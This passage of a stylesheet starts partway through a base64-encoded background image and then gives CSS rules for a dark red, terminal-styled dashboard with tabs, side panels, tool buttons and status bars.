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') center/cover fixed;color:var(--red);font-family:'Courier New',monospace;font-size:13px;min-height:100vh;overflow-x:hidden}
body::before{display:none}

/* Header */
#header{position:relative;z-index:1;text-align:center;padding:6px 20px 4px;border-bottom:1px solid var(--border);background:rgba(4,0,0,0.75)}
#header h1{font-size:2.3em;color:var(--red);letter-spacing:.12em;font-weight:bold;text-shadow:0 0 20px var(--red)66}
#header .sub{color:var(--dim);font-size:.8em;letter-spacing:.2em;margin-top:4px}
.hdr-corner{position:absolute;top:0;width:30px;height:30px;border-color:var(--red);border-style:solid}
.hdr-tl{left:8px;top:8px;border-width:2px 0 0 2px}
.hdr-tr{right:8px;top:8px;border-width:2px 2px 0 0}

/* Nav tabs */
#nav{position:relative;z-index:1;display:flex;gap:4px;padding:8px 16px;border-bottom:1px solid var(--border);background:rgba(3,0,0,0.88)}
.tab-btn{background:transparent;border:1px solid var(--border);color:var(--tabc);padding:6px 14px;cursor:pointer;font-family:inherit;font-size:.8em;letter-spacing:.08em;border-radius:2px;transition:all .2s;white-space:nowrap}
.tab-btn.active{background:var(--ddim);border-color:var(--red);color:var(--red);box-shadow:0 0 8px var(--red)33}
.tab-btn:hover:not(.active){border-color:var(--border);color:var(--xred)}

/* Main layout */
#main{position:relative;z-index:1;display:grid;grid-template-columns:280px 1fr 280px;gap:0;height:calc(100vh - 120px);overflow:hidden}
/* When the terminal tab is active, give the left column most of the width. */
#main.term-wide{grid-template-columns:1fr 280px}

/* Side panels */
.side-panel{padding:12px;border-right:1px solid var(--border);overflow-y:auto;background:rgba(4,0,0,0.82);backdrop-filter:blur(1px)}
.side-panel.right{border-right:none;border-left:1px solid var(--border)}
.panel-title{color:var(--red);font-size:.75em;letter-spacing:.15em;border-bottom:1px solid var(--dim);padding-bottom:4px;margin-bottom:10px}

/* Center content */
#center{display:flex;flex-direction:column;overflow:hidden}
#rat-zone{position:relative;flex:1;min-height:0;overflow:hidden;border-bottom:1px solid var(--border)}
#rat-svg{display:none}
#output-zone{border-top:1px solid var(--border);padding:8px 12px;height:160px;overflow-y:auto;background:rgba(4,0,0,0.85)}

/* Tool buttons */
.tool-btn{display:flex;align-items:center;gap:8px;width:100%;background:var(--card);border:1px solid var(--dim);color:var(--sec);padding:8px 10px;cursor:pointer;font-family:inherit;font-size:.8em;margin-bottom:6px;border-radius:2px;transition:all .2s;text-align:left}
.tool-btn:hover{background:var(--ddim);border-color:var(--dred);color:var(--red);box-shadow:0 0 6px var(--red)22}
.tool-btn .icon{font-size:1em;min-width:18px}
.section-label{color:var(--border);font-size:.7em;letter-spacing:.15em;margin:10px 0 6px;text-transform:uppercase}

/* Status items */
.stat-row{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--card);font-size:.8em}
.stat-key{color:var(--border)}
.stat-val{color:var(--xred)}
.stat-val.active{color:var(--xred)}
.bar-wrap{flex:1;margin:0 8px;background:var(--card);height:6px;border-radius:1px;align-self:center}
.bar-fill{height:100%;background:var(--dred);border-radius:1px;transition:width .5s}

/* Active tools pills */
.pill{display:inline-block;background:#150000;border:1px solid var(--dim);color:#cc2222;padding:3px 10px;border-radius:2px;font-size:.75em;margin:2px}
.pill::before{content:'● ';color:var(--red)}

